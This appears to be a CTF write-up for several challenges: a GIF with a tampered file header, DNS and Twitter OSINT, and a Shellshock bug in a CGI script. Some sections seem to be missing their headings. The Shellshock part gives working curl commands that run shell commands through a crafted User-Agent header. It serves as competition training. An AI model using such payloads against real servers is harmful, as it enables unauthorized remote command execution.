# Merry Christmas (Forensic, 200)
### Description
OSINT is the way
<br>
<br>

### Solution

We were given a zip file named `output.zip` and a hint `What is mrT4ntr4's last name?` 

Most probably the password of the zip file is mrT4ntr4's last name. So let's search it over the internet.

After extracting the zip file with a password "Malhotra", there's this file named `flag.gif`. Did some check on the gif file and foundout that the header was modified.

![nice](/assets/images/Screenshot_2019-12-28_05-57-28.png)

The file signature for GIF file should be like this **47 49 46 38 37 61** or **47 49 46 38 39 61**

Fixing the modified header to its original will give us the flag!

### Solution

The title itself gives me an idea that maybe it's a shellshock bash bug.

Checking the source code of the website gives me this file `bashferno.cgi`

![nice](/assets/images/Screenshot_2019-12-28_06-15-42.png)

Ok lets try to get that flag using shellshock exploit.

> curl -H "user-agent: () { :; }; echo; echo; /bin/ls" http://104.197.168.32:17012/bashferno.cgi

![nice](/assets/images/Screenshot_2019-12-28_06-20-42.png)

cat'ting the txt file will give us the flag

``` 
curl -H "user-agent: () { :; }; echo; echo; /bin/cat flag_for_this_INFERNO.txt" http://104.197.168.32:17012/bashferno.cgi
```
reading the text file will give us the flag.

# Check Again (200)
### Description
_Did you check the site , I mean check again._
<br>
<br>

### Solution

We we're given a text file named `Openit` and a hint `Dante Nero Sparda are the true demons.`

Checking the text file give me this lol

> Check Again!!!
> 
> 
> ...
> 
> 
> Press Home Btn.

As you can see in the hint `D`ante `N`ro `S`parda are the true demons.

So okay, we need to check the DNS of the website.

I used [dnsrecon](https://github.com/darkoperator/dnsrecon) for this.

``` 
dnsrecon -d infernoctf.live -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
```

Hello Angry Employer,

I will not stand for this, it was a simple mistake that anyone could have
made.
If anything, I should blame your company training!
I'm leaking all confidential information, on purpose this time.

Hope you like being the center of attention on infosec twitter!

Hello Mr. imdeveloper123,

Are you kidding me? You leaked company info by making the dot-files you
use for work purposes *public* on your GitHub?
It should come at no surprise that as of the time of writing this email,
you are permanently released from your current job.

Please talk to HR ASAP.

This line `Hope you like being the center of attention on infosec twitter!` gives me an idea. Let's find something useful on twitter! 

Tried searching `imdeveloper123` on twitter and it leads me to this account [@imdeveloper123](https://twitter.com/imdeveloper123)
